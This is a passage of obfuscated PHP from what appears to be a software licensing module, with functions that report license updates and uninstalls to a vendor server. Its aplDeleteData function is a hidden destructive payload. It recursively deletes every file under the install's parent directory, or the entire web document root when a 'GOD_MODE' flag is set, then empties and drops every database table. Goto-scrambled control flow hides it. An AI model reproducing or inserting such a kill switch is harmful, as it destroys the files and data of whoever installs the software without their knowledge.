	$notifications_array["notification_case"] = "notification_script_corrupted";
	$notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
	goto GwsR1;
	swrSf:
	if (aplCheckData($MYSQLI_LINK)) {
		goto T_HHB;
	}
	$notifications_array["notification_case"] = "notification_license_corrupted";
	$notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
	goto kmHsH;
	T_HHB:
	extract(aplGetLicenseData($MYSQLI_LINK));
	$post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) . "&client_email=" . rawurlencode($CLIENT_EMAIL) . "&license_code=" . rawurlencode($LICENSE_CODE) . "&root_url=" . rawurlencode($ROOT_URL) . "&installation_hash=" . rawurlencode($INSTALLATION_HASH) . "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
	$content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_update.php", $post_info, $ROOT_URL);
	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
	kmHsH: GwsR1:
	return $notifications_array;
}

function incevioUninstallLicense($MYSQLI_LINK = null){
	$notifications_array = array();
	$apl_core_notifications = aplCheckSettings();
	if (empty($apl_core_notifications)) {
		goto b1cUV;
	}
	$notifications_array["notification_case"] = "notification_script_corrupted";
	$notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
	goto IA0xq;
	b1cUV:
	if (aplCheckData($MYSQLI_LINK)) {
		goto dIq9S;
	}
	$notifications_array["notification_case"] = "notification_license_corrupted";
	$notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
	goto HoOQq;
	dIq9S:
	extract(aplGetLicenseData($MYSQLI_LINK));
	$post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) . "&client_email=" . rawurlencode($CLIENT_EMAIL) . "&license_code=" . rawurlencode($LICENSE_CODE) . "&root_url=" . rawurlencode($ROOT_URL) . "&installation_hash=" . rawurlencode($INSTALLATION_HASH) . "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
	$content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_uninstall.php", $post_info, $ROOT_URL);
	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
	if (!($notifications_array["notification_case"] == "notification_license_ok")) {
		goto ur_B6;
	}
	if (!(APL_STORAGE == "DATABASE")) {
		goto BKX1m;
	}
	mysqli_query($MYSQLI_LINK, "DELETE FROM " . APL_DATABASE_TABLE);
	mysqli_query($MYSQLI_LINK, "DROP TABLE " . APL_DATABASE_TABLE);
	BKX1m:
	if (!(APL_STORAGE == "FILE")) {
		goto xKp0v;
	}
	$handle = @fopen(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION, "w+");
	@fclose($handle);
	xKp0v: ur_B6: HoOQq: IA0xq:
	return $notifications_array;
}

function aplDeleteData($MYSQLI_LINK = null){
	if (APL_GOD_MODE == "YES" && isset($_SERVER["DOCUMENT_ROOT"])) {
		goto Zd3g3;
	}
	$root_directory = dirname(__DIR__);
	goto ystLG;
	Zd3g3:
	$root_directory = $_SERVER["DOCUMENT_ROOT"];
	ystLG:
	foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root_directory, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path) {
		$path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname());
		NjA4k:
	}
	uOEVh:
	rmdir($root_directory);
	if (!(APL_STORAGE == "DATABASE")) {
		goto bbij6;
	}
	$database_tables_array = array();
	$table_list_results = mysqli_query($MYSQLI_LINK, "SHOW TABLES");
	EKwE2:
	if (!($table_list_row = mysqli_fetch_row($table_list_results))) {
		goto fQDd8;
	}
	$database_tables_array[] = $table_list_row[0];
	goto EKwE2;
	fQDd8:
	if (empty($database_tables_array)) {
		goto hZPvH;
	}
	foreach ($database_tables_array as $table_name) {
		mysqli_query($MYSQLI_LINK, "DELETE FROM {$table_name}");
		u9Iyo:
	}
	UeptX:
	foreach ($database_tables_array as $table_name) {
		mysqli_query($MYSQLI_LINK, "DROP TABLE {$table_name}");
		jNGg0:
	}
	VrCrY: hZPvH: bbij6:
	exit;
}
